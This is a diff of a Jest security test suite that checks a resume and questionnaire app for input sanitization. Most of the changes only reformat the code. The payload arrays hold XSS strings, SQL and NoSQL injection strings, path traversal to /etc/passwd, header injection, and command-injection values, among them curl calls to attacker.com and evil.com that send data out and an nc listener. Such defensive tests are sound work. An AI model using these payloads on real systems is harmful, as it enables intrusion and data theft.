@@ -5,7 +5,7 @@ import { AppModule } from '../../src/app/app.module';
 
 /**
  * 🛡️ INPUT VALIDATION & SANITIZATION SECURITY TESTS
- * 
+ *
  * Comprehensive security validation for input handling and data sanitization:
  * - XSS (Cross-Site Scripting) prevention
  * - SQL injection prevention
@@ -30,14 +30,14 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
     email: 'input.admin@test.com',
     password: 'SecurePassword123!@#',
     name: 'Input Security Admin',
-    role: 'admin'
+    role: 'admin',
   };
 
   const testUser = {
     email: 'input.user@test.com',
     password: 'SecurePassword123!@#',
     name: 'Input Security User',
-    role: 'user'
+    role: 'user',
   };
 
   beforeAll(async () => {
@@ -60,18 +60,18 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
       .post('/auth/register')
       .send({
         ...testAdmin,
-        organizationName: 'Input Security Test Organization'
+        organizationName: 'Input Security Test Organization',
       });
-    
+
     testOrganizationId = orgResponse.body.data.organizationId;
-    
+
     const adminLoginResponse = await request(app.getHttpServer())
       .post('/auth/login')
       .send({
         email: testAdmin.email,
-        password: testAdmin.password
+        password: testAdmin.password,
       });
-    
+
     adminToken = adminLoginResponse.body.data.accessToken;
 
     // Create test user
@@ -79,18 +79,18 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
       .post('/auth/register')
       .send({
         ...testUser,
-        organizationId: testOrganizationId
+        organizationId: testOrganizationId,
       });
-    
+
     testUserId = userResponse.body.data.userId;
-    
+
     const userLoginResponse = await request(app.getHttpServer())
       .post('/auth/login')
       .send({
         email: testUser.email,
-        password: testUser.password
+        password: testUser.password,
       });
-    
+
     userToken = userLoginResponse.body.data.accessToken;
   }
 
@@ -122,7 +122,7 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
             name: payload,
             bio: `User bio with ${payload}`,
             location: payload,
-            website: `https://example.com${payload}`
+            website: `https://example.com${payload}`,
           });
 
         // Should either reject or sanitize
@@ -133,7 +133,7 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
             .set('Authorization', `Bearer ${userToken}`);
 
           expect(profileResponse.status).toBe(200);
-          
+
           // XSS payloads should be sanitized
           const profile = profileResponse.body.data;
           expect(profile.name).not.toContain('<script>');
@@ -150,12 +150,13 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
     it('should sanitize XSS in questionnaire content', async () => {
       const maliciousQuestionnaire = {
         title: '<script>alert("xss")</script>Malicious Questionnaire',
-        description: 'Description with <img src="x" onerror="alert(1)"> payload',
+        description:
+          'Description with <img src="x" onerror="alert(1)"> payload',
         questions: [
           {
             type: 'text',
             question: 'What is your <svg onload="alert(1)"> experience?',
-            required: true
+            required: true,
           },
           {
             type: 'multiple_choice',
@@ -163,11 +164,11 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
             options: [
               'Option 1<script>alert(1)</script>',
               '<iframe src="javascript:alert(1)">Option 2</iframe>',
-              'Normal Option'
+              'Normal Option',
             ],
-            required: true
-          }
-        ]
+            required: true,
+          },
+        ],
       };
 
       const response = await request(app.getHttpServer())
@@ -184,11 +185,13 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
 
         expect(getResponse.status).toBe(200);
         const questionnaire = getResponse.body.data;
-        
+
         expect(questionnaire.title).not.toContain('<script>');
         expect(questionnaire.description).not.toContain('<img');
         expect(questionnaire.questions[0].question).not.toContain('<svg');
-        expect(questionnaire.questions[1].options.join(' ')).not.toContain('<script>');
+        expect(questionnaire.questions[1].options.join(' ')).not.toContain(
+          '<script>',
+        );
       } else {
         expect([400, 422]).toContain(response.status);
       }
@@ -203,8 +206,8 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
         metadata: {
           page: '<iframe src="javascript:alert(1)"></iframe>',
           userAgent: 'Mozilla/5.0<script>alert(1)</script>',
-          customData: '<object data="javascript:alert(1)">'
-        }
+          customData: '<object data="javascript:alert(1)">',
+        },
       };
 
       const response = await request(app.getHttpServer())
@@ -214,7 +217,7 @@ describe('🛡️ Input Validation & Sanitization Security Tests', () => {
 
       // Should either reject malicious content or sanitize it
       expect([201, 400, 422]).toContain(response.status);
-      
+
       if (response.status === 201) {
         // Event should be sanitized
         expect(response.body.data.processed).toBe(true);
@@ -268,12 +271,12 @@ Malicious PDF content with XSS payload`;
     ];
 
     const nosqlInjectionPayloads = [
-      "{ \"$ne\": null }",
-      "{ \"$gt\": \"\" }",
-      "{ \"$where\": \"this.email == this.email\" }",
-      "{ \"$regex\": \".*\" }",
-      "{ \"$or\": [ {}, { \"_id\": { \"$ne\": null } } ] }",
-      "{ \"$javascript\": \"return true\" }",
+      '{ "$ne": null }',
+      '{ "$gt": "" }',
+      '{ "$where": "this.email == this.email" }',
+      '{ "$regex": ".*" }',
+      '{ "$or": [ {}, { "_id": { "$ne": null } } ] }',
+      '{ "$javascript": "return true" }',
       "'; return db.users.find(); var x='",
     ];
 
@@ -283,7 +286,7 @@ Malicious PDF content with XSS payload`;
           .post('/auth/login')
           .send({
             email: payload,
-            password: 'any-password'
+            password: 'any-password',
           });
 
         // Should reject malicious input
@@ -301,12 +304,12 @@ Malicious PDF content with XSS payload`;
           .send({
             skills: payload,
             experience: { min: 0, max: payload },
-            location: payload
+            location: payload,
           });
 
         // Should reject or sanitize malicious queries
         expect([200, 400, 422]).toContain(searchResponse.status);
-        
+
         if (searchResponse.status === 200) {
           // Should return empty or safe results
           expect(searchResponse.body.data.resumes).toBeDefined();
@@ -318,9 +321,9 @@ Malicious PDF content with XSS payload`;
     it('should prevent injection in questionnaire filters', async () => {
       const injectionAttempts = [
         { status: "' OR '1'='1" },
-        { createdBy: { "$ne": null } },
-        { title: { "$regex": ".*", "$options": "i" } },
-        { "_id": { "$gt": "" } }
+        { createdBy: { $ne: null } },
+        { title: { $regex: '.*', $options: 'i' } },
+        { _id: { $gt: '' } },
       ];
 
       for (const filter of injectionAttempts) {
@@ -331,7 +334,7 @@ Malicious PDF content with XSS payload`;
 
         // Should handle safely without exposing data
         expect([200, 400, 422]).toContain(response.status);
-        
+
         if (response.status === 200) {
           expect(response.body.data.questionnaires).toBeDefined();
           expect(Array.isArray(response.body.data.questionnaires)).toBe(true);
@@ -342,9 +345,9 @@ Malicious PDF content with XSS payload`;
     it('should prevent injection in analytics queries', async () => {
       const maliciousQueries = [
         { timeRange: "'; DROP TABLE analytics; --" },
-        { eventType: { "$ne": null } },
+        { eventType: { $ne: null } },
         { userId: "' UNION SELECT * FROM users --" },
-        { organizationId: { "$where": "return true" } }
+        { organizationId: { $where: 'return true' } },
       ];
 
       for (const query of maliciousQueries) {
@@ -369,7 +372,7 @@ Malicious PDF content with XSS payload`;
       '& ping google.com',
       '|| curl http://attacker.com',
       '; nc -l 4444',
-      '`curl -X POST http://evil.com/steal-data`'
+      '`curl -X POST http://evil.com/steal-data`',
     ];
 
     it('should prevent command injection in file processing', async () => {
@@ -377,7 +380,11 @@ Malicious PDF content with XSS payload`;
         const response = await request(app.getHttpServer())
           .post('/resumes/upload')
           .set('Authorization', `Bearer ${userToken}`)
-          .attach('resume', Buffer.from('PDF content'), `malicious${payload}.pdf`)
+          .attach(
+            'resume',
+            Buffer.from('PDF content'),
+            `malicious${payload}.pdf`,
+          )
           .field('candidateName', `John${payload}`)
           .field('candidateEmail', 'john@test.com')
           .field('processingOptions', payload);
@@ -393,11 +400,11 @@ Malicious PDF content with XSS payload`;
         format: 'json; cat /etc/passwd',
         dateRange: {
           startDate: new Date().toISOString(),
-          endDate: `${new Date().toISOString()}; ls -la`
+          endDate: `${new Date().toISOString()}; ls -la`,
         },
         filters: {
-          command: '`whoami`'
-        }
+          command: '`whoami`',
+        },
       };
 
       const response = await request(app.getHttpServer())
@@ -419,7 +426,7 @@ Malicious PDF content with XSS payload`;
       '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
       '/var/www/../../etc/passwd',
       'file:///etc/passwd',
-      '\\\\server\\share\\file.txt'
+      '\\\\server\\share\\file.txt',
     ];
 
     it('should prevent path traversal in file access', async () => {
@@ -428,7 +435,7 @@ Malicious PDF content with XSS payload`;
         const endpoints = [
           `/resumes/download/${encodeURIComponent(payload)}`,
           `/analytics/reports/${encodeURIComponent(payload)}`,
-          `/questionnaire/export/${encodeURIComponent(payload)}`
+          `/questionnaire/export/${encodeURIComponent(payload)}`,
         ];
 
         for (const endpoint of endpoints) {
@@ -443,7 +450,8 @@ Malicious PDF content with XSS payload`;
     });
 
     it('should prevent path traversal in file uploads', async () => {
-      for (const payload of pathTraversalPayloads.slice(0, 5)) { // Limit for performance
+      for (const payload of pathTraversalPayloads.slice(0, 5)) {
+        // Limit for performance
         const response = await request(app.getHttpServer())
           .post('/resumes/upload')
           .set('Authorization', `Bearer ${userToken}`)
@@ -469,7 +477,7 @@ Malicious PDF content with XSS payload`;
         // Array expected but object provided
         skills: { skill: 'JavaScript' },
         // Object expected but string provided
-        address: 'Some address string'
+        address: 'Some address string',
       };
 
       const response = await request(app.getHttpServer())
@@ -492,7 +500,7 @@ Malicious PDF content with XSS payload`;
         // Empty required fields
         email: '',
         // Very long arrays
-        skills: new Array(1000).fill('skill')
+        skills: new Array(1000).fill('skill'),
       };
 
       const response = await request(app.getHttpServer())
@@ -514,7 +522,7 @@ Malicious PDF content with XSS payload`;
         'user@domain..com',
         'user name@domain.com',
         'user@domain.com.',
-        '<script>alert(1)</script>@domain.com'
+        '<script>alert(1)</script>@domain.com',
       ];
 
       for (const email of invalidEmails) {
@@ -524,7 +532,7 @@ Malicious PDF content with XSS payload`;
             email: email,
             password: 'ValidPassword123!',
             name: 'Test User',
-            organizationId: testOrganizationId
+            organizationId: testOrganizationId,
           });
 
         expect([400, 422]).toContain(response.status);
@@ -563,7 +571,7 @@ Malicious PDF content with XSS payload`;
       'value\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK',
       'value\\x0D\\x0ASet-Cookie: session=hijacked',
       'value%0d%0aSet-Cookie: admin=true',
-      'value%0ALocation:%20http://attacker.com'
+      'value%0ALocation:%20http://attacker.com',
     ];
 
     it('should prevent header injection in responses', async () => {
@@ -573,7 +581,7 @@ Malicious PDF content with XSS payload`;
           .set('Authorization', `Bearer ${userToken}`)
           .send({
             name: payload,
-            bio: `Bio with ${payload}`
+            bio: `Bio with ${payload}`,
           });
 
         // Should not contain injected headers in response
@@ -586,7 +594,7 @@ Malicious PDF content with XSS payload`;
       const maliciousHeaders = {
         'User-Agent': 'Mozilla/5.0\\r\\nSet-Cookie: admin=true',
         'X-Forwarded-For': '127.0.0.1\\r\\nHost: evil.com',
-        'X-Custom-Header': 'value\\nContent-Type: text/html'
+        'X-Custom-Header': 'value\\nContent-Type: text/html',
       };
 
       const response = await request(app.getHttpServer())
@@ -604,7 +612,9 @@ Malicious PDF content with XSS payload`;
       const xmlResponse = await request(app.getHttpServer())
         .post('/auth/login')
         .set('Content-Type', 'application/xml')
-        .send('<login><email>test@test.com</email><password>password</password></login>');
+        .send(
+          '<login><email>test@test.com</email><password>password</password></login>',
+        );
 
       expect([400, 415]).toContain(xmlResponse.status);
 
@@ -637,8 +647,8 @@ Malicious PDF content with XSS payload`;
       '*)(|(password=*))',
       '*))(|(uid=*',
       '*))%00',
-      '*()|&\'',
-      '*)(objectClass=*'
+      "*()|&'",
+      '*)(objectClass=*',
     ];
 
     it('should prevent LDAP injection in user search', async () => {
@@ -649,11 +659,11 @@ Malicious PDF content with XSS payload`;
           .query({
             search: payload,
             email: payload,
-            name: payload
+            name: payload,
           });
 
         expect([200, 400, 422]).toContain(response.status);
-        
+
         if (response.status === 200) {
           // Should return safe results without exposing all users
           expect(response.body.data.totalCount).toBeDefined();
@@ -665,26 +675,31 @@ Malicious PDF content with XSS payload`;
 
   describe('📋 Input Security Summary', () => {
     it('should validate comprehensive input security', async () => {
-      console.log('\\n🛡️ INPUT VALIDATION & SANITIZATION SECURITY TEST SUMMARY');
+      console.log(
+        '\\n🛡️ INPUT VALIDATION & SANITIZATION SECURITY TEST SUMMARY',
+      );
       console.log('=======================================================');
-      
+
       const securityValidations = {
         xssPrevention: '✅ XSS payload sanitization in all user inputs',
         sqlInjectionPrevention: '✅ SQL/NoSQL injection prevention in queries',
-        commandInjectionPrevention: '✅ Command injection prevention in file processing',
+        commandInjectionPrevention:
+          '✅ Command injection prevention in file processing',
         pathTraversalPrevention: '✅ Path traversal prevention in file access',
         dataTypeValidation: '✅ Strict data type and boundary validation',
         headerInjectionPrevention: '✅ HTTP header injection prevention',
         contentTypeValidation: '✅ Content type and JSON structure validation',
-        ldapInjectionPrevention: '✅ LDAP injection prevention in searches'
+        ldapInjectionPrevention: '✅ LDAP injection prevention in searches',
       };
 
       Object.entries(securityValidations).forEach(([check, status]) => {
         console.log(`   ${check}: ${status}`);
       });
 
-      console.log('\\n🎉 Input Validation & Sanitization Security Validation Completed');
-      
+      console.log(
+        '\\n🎉 Input Validation & Sanitization Security Validation Completed',
+      );
+
       expect(Object.keys(securityValidations).length).toBeGreaterThan(0);
     });
   });
